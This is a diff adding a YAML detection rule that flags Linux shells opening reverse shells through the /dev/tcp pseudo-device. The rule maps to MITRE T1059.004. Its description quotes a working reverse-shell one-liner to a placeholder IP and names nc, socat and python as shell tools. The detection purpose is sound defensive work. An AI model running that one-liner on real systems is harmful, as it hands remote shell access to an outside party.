@@ -1,0 +1,42 @@
+id: DET-LNX-001
+name: Reverse Shell via /dev/tcp Redirection
+description: >-
+  Detects a Bash/Dash shell using the /dev/tcp pseudo-device to open a raw
+  TCP socket and redirect it to a shell (e.g. bash -i >& /dev/tcp/1.2.3.4/4444
+  0>&1), a common fileless reverse-shell technique on Linux that needs no
+  external binary (nc, socat, python) to establish outbound C2.
+version: 1
+status: enabled
+event_type: process_create
+
+logic:
+  all:
+    - field: process.name
+      operator: in
+      value:
+        - bash
+        - dash
+        - sh
+    - field: process.command_line
+      operator: contains
+      value: /dev/tcp/
+
+severity: critical
+confidence: 0.90
+
+evidence:
+  - process.name
+  - process.command_line
+  - process.pid
+  - parent.name
+  - parent.pid
+
+mitre:
+  tactic: Command and Control
+  technique: T1059.004
+  name: "Command and Scripting Interpreter: Unix Shell"
+
+tags:
+  - attack.command_and_control
+  - linux
+  - reverse_shell
